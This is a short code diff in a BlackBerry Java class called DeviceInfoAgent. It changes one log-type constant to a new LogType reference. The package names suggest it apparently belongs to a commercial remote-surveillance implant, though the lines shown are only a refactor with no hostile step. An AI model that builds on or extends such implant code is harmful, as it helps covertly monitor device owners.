@@ -5,6 +5,7 @@ import net.rim.device.api.system.DeviceInfo;
 import com.ht.rcs.blackberry.Device;
 
 import com.ht.rcs.blackberry.log.Log;
+import com.ht.rcs.blackberry.log.LogType;
 import com.ht.rcs.blackberry.utils.Check;
 import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
@@ -16,7 +17,7 @@ public class DeviceInfoAgent extends Agent {
 
     public DeviceInfoAgent(boolean agentStatus) {
         super(AGENT_DEVICE, agentStatus, true);
-        Check.asserts(Log.convertTypeLog(this.agentId) == Log.LOGTYPE_DEVICE,
+        Check.asserts(Log.convertTypeLog(this.agentId) == LogType.DEVICE,
                 "Wrong Conversion");
 
         device = Device.getInstance();
